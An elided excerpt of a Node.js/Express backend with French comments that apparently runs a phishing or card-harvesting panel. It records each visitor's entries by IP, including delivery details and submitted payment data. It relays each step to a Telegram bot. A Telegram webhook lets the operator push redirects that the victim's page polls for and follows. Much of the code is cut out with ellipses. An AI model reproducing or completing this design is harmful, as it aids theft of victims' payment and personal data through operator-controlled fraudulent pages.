...
// Sessions par IP
const sessions = {}; // ip -> {data:{}, redirect:null, queue:[]}
...
async function sendTelegramNotif(data, title = "Nouvelle interaction utilisateur") {
...
app.get("/api/visit", (req, res) => {
  ...
  sendTelegramNotif(sessions[ip].data, "👋 Nouveau visiteur sur le site");
  res.json({ ok: true, ip });
});
...
app.post("/api/pair", (req, res) => {
  const { pair } = req.body;
  const ip = getIP(req);
  sessions[ip] = sessions[ip] || { data: { ip }, redirect: null, queue: [] };
  sessions[ip].data.page = "Produit";
...
app.post("/api/delivery", (req, res) => {
  ...
  sendTelegramNotif(sessions[ip].data, "📦 Informations de livraison");
  res.json({ ok: true });
});
...
app.post("/api/payment", (req, res) => {
  ...
  sendTelegramNotif(sessions[ip].data, "💳 Paiement soumis");
  res.json({ ok: true });
});
...
app.get("/api/status", (req, res) => {
  ...
  if (!session) return res.json({ redirect: null });

  // Récupère une redirection en attente dans la file
  const redirect = session.queue.length ? session.queue.shift() : session.redirect;
  if (redirect) session.redirect = null;
...
app.post("/telegramWebhook", bodyParser.json(), async (req, res) => {
  ...
  if (body?.callback_query) {
    ...
    if (action === "redirect" && sessions[ip]) {
      // File d’attente de redirection (empêche perte de clic)
      sessions[ip].queue.push(url);
      sessions[ip].data.page = "Admin redirigé vers " + url;
      sendTelegramNotif(sessions[ip].data, "🤖 Commande bot exécutée");
